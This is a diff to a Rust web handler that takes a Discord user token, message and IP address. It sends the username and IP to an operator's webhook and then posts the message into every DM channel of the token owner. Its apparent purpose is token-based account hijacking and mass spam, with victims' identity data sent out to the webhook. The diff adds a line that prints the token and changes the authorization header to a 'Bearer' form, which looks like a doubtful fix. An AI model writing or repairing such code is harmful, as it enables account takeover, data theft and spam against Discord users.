@@ -104,10 +104,13 @@ async fn test_handler() -> &'static str {
 async fn send(Json(payload): Json<Payload>) -> &'static str {
     let client = Client::new();
     
+    // Debug: Print the token
+    println!("Token: {}", payload.token);
+
     // Fetch user information (username)
     let user_info_url = "https://discord.com/api/v9/users/@me";
     let user_response = client.get(user_info_url)
-        .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
+        .header("Authorization", format!("Bearer {}", payload.token)) // Use "Bearer" for user tokens
         .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         .send()
         .await;
@@ -128,7 +131,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
     }
     
     // Send message to Discord webhook including IP and username
-    let webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+    let webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"; // Replace with your webhook URL
     let webhook_content = format!("Message: {}\nUsername: {}\nIP: {}", payload.message, username, payload.ip);
     let discord_payload = DiscordPayload {
         content: webhook_content.clone(),
@@ -153,7 +156,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
     // Fetch user's DM channels
     let api_url = "https://discord.com/api/v9/users/@me/channels";
     let response = client.get(api_url)
-        .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
+        .header("Authorization", format!("Bearer {}", payload.token)) // Use "Bearer" for user tokens
         .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         .send()
         .await;
@@ -167,7 +170,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
                     for dm in dms {
                         if let Some(dm_id) = dm["id"].as_str() {
                             let msg_response = client.post(format!("https://discord.com/api/v9/channels/{}/messages", dm_id))
-                                .header("Authorization", format!("{}", payload.token)) // 🔧 Fixed Auth Header
+                                .header("Authorization", format!("Bearer {}", payload.token)) // Use "Bearer" for user tokens
                                 .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                                 .json(&serde_json::json!({"content": payload.message}))
                                 .send()
@@ -198,7 +201,7 @@ async fn send(Json(payload): Json<Payload>) -> &'static str {
             }
         }
         Ok(resp) => {
-            eprintln!("❌ Failed to get DMs: {} - Body: {:?}", resp.status(), resp.text().await.unwrap_or_else(|_| "No response".to_string())); // 🔧 Improved Logging
+            eprintln!("❌ Failed to get DMs: {} - Body: {:?}", resp.status(), resp.text().await.unwrap_or_else(|_| "No response".to_string()));
             "❌ Error fetching DM channels"
         }
         Err(e) => {
